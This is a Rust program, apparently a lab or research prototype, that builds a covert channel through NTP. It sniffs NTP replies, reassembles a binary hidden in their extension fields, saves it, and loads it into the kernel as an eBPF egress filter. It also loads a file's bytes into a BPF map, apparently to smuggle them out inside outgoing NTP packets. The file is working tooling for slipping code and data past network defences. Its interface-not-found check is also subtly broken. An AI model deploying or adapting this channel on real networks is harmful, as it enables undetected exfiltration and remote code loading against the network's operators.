use pnet::datalink::{Channel, NetworkInterface};
use slog::{crit, debug, info, warn};

use crate::{
    DataChunk, ExtensionField, NtpExtensionless, ETHERNET_HEADER_LEN, IPV4_HEADER_LEN, LOGGER,
    UDP_HEADER_LEN, VALUE_LEN,
};
use aya::maps::perf::PerfEventArrayBuffer;
use aya::maps::{MapRefMut, PerfEventArray};
use aya::programs::{tc, Link, SchedClassifier, TcAttachType};
use aya::util::online_cpus;
use aya::Bpf;
use bytes::BytesMut;
use mio::unix::SourceFd;
use mio::{Events, Interest, Token};
use std::collections::HashMap;
use std::convert::{TryFrom, TryInto};
use std::error::Error;
use std::os::unix::io::AsRawFd;
use std::time::Duration;

fn poll_buffers(buf: Vec<PerfEventArrayBuffer<MapRefMut>>) {
    let mut poll = mio::Poll::new().unwrap();

    let mut out_bufs = [BytesMut::with_capacity(1024)];

    let mut tokens: HashMap<Token, PerfEventArrayBuffer<MapRefMut>> = buf
        .into_iter()
        .map(
            |p| -> Result<(Token, PerfEventArrayBuffer<MapRefMut>), Box<dyn Error>> {
                let token = Token(p.as_raw_fd() as usize);
                poll.registry().register(
                    &mut SourceFd(&p.as_raw_fd()),
                    token,
                    Interest::READABLE,
                )?;
                Ok((token, p))
            },
        )
        .collect::<Result<HashMap<Token, PerfEventArrayBuffer<MapRefMut>>, Box<dyn Error>>>()
        .unwrap();

    let mut events = Events::with_capacity(1024);
    loop {
        match poll.poll(&mut events, Some(Duration::from_millis(100))) {
            Ok(_) => {
                events
                    .iter()
                    .filter(|event| event.is_readable())
                    .map(|e| e.token())
                    .for_each(|t| {
                        let buf = tokens.get_mut(&t).unwrap();
                        buf.read_events(&mut out_bufs).unwrap();
                        debug!(LOGGER, "buf: {:?}", out_bufs.get(0).unwrap());
                    });
            }
            Err(e) => {
                crit!(LOGGER, "critical error: {:?}", e);
                panic!()
            }
        }
    }
}

fn load_received_filter(interface_name: &str) -> Result<(), Box<dyn Error>> {
    let mut bpf = Bpf::load_file("/home/vagrant/saved_object")?;
    let file_bytes = std::fs::read("/home/vagrant/saved_object")?;
    if let Err(e) = tc::qdisc_add_clsact(interface_name) {
        warn!(LOGGER, "Interface already configured: {:?}", e);
        warn!(
            LOGGER,
            "If the filter misbehaves, manually remove the tc qdisc."
        );
        warn!(LOGGER, "You can probably ignore this.");
    }

    debug!(LOGGER, "Writing '{:x?}' to map.", file_bytes);
    let mut msg_array =
        aya::maps::Array::<MapRefMut, DataChunk>::try_from(bpf.map_mut("msg_array")?)?;
    let mut idx = 0;
    file_bytes.chunks(VALUE_LEN).into_iter().for_each(|ch| {
        let mut ch = ch.to_vec();
        for _ in ch.len()..VALUE_LEN {
            ch.extend_from_slice(&[0xBEu8]);
        }
        let ch = ch.as_slice(); //.read_u64::<LittleEndian>().unwrap();
        let mut data = [0u8; VALUE_LEN];
        data.copy_from_slice(ch);
        let d = DataChunk { data };
        msg_array.set(idx, d, 0).expect("could not write to map");
        idx += 1;
    });
    msg_array
        .set(
            idx,
            DataChunk {
                data: [0xBEu8; VALUE_LEN],
            },
            0,
        )
        .expect("could not write done flag to map");

    let prog: &mut SchedClassifier = bpf.program_mut("ntp_filter")?.try_into()?;
    prog.load()?;
    let mut linkref = prog.attach(interface_name, TcAttachType::Egress)?;
    debug!(LOGGER, "Received NTP filter loaded and attached.");

    let mut perf_array = PerfEventArray::try_from(bpf.map_mut("ntp_filter_events")?)?;

    let mut perf_buffers = Vec::new();
    for cpuid in online_cpus()? {
        perf_buffers.push(perf_array.open(cpuid, None)?);
    }

    // poll the buffers to know when they have queued events
    poll_buffers(perf_buffers);

    linkref.detach()?;

    debug!(LOGGER, "NTP filter detached.");

    Ok(())
}

pub fn run_dmz(interface: &str) {
    let mut pnet_iface: NetworkInterface = NetworkInterface {
        name: "none".to_string(),
        description: "".to_string(),
        index: 0,
        mac: None,
        ips: vec![],
        flags: 0,
    };

    for iface in pnet::datalink::interfaces() {
        if iface.name.eq(interface) {
            pnet_iface = iface;
            break;
        }
    }

    if pnet_iface.name.eq("nonexistent") {
        panic!("could not find interface: {}", interface);
    }

    let (_tx, mut rx) = match pnet::datalink::channel(&pnet_iface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("unknown channel type"),
        Err(e) => panic!("err: {}", e),
    };

    info!(LOGGER, "Listening on {}", pnet_iface.name);

    let mut data_recv = Vec::<u8>::new();

    loop {
        let packet = rx.next().unwrap();
        let eth = pnet::packet::ethernet::EthernetPacket::new(packet).unwrap();
        if eth.get_ethertype() != pnet::packet::ethernet::EtherTypes::Ipv4 {
            continue;
        }
        let udp_packet = match pnet::packet::udp::UdpPacket::new(
            &packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..],
        ) {
            Some(pkt) => pkt,
            None => continue,
        };

        if udp_packet.get_source() == 123 {
            let payload = &packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN + UDP_HEADER_LEN)..];
            if payload[std::mem::size_of::<NtpExtensionless>()..].len()
                == std::mem::size_of::<ExtensionField>()
            {
                let extension: ExtensionField = unsafe {
                    std::ptr::read(
                        payload[std::mem::size_of::<NtpExtensionless>()..].as_ptr() as *const _
                    )
                };
                info!(LOGGER, "value: {}", extension);
                if extension.value == [0xBEu8; VALUE_LEN] {
                    info!(LOGGER, "detected end flag extension field, saving contents");
                    break;
                }
                data_recv.extend_from_slice(&extension.value);
            }
        }
    }
    info!(LOGGER, "trimming 0xBE from end of binary");
    loop {
        if *data_recv.last().unwrap() == 0xBEu8 {
            data_recv.remove(data_recv.len() - 1);
        } else {
            break;
        }
    }
    info!(LOGGER, "Saving file to ~/saved_object");
    std::fs::write("/home/vagrant/saved_object", data_recv)
        .expect("could not write `saved_object` to home directory");

    load_received_filter(interface).unwrap();
}
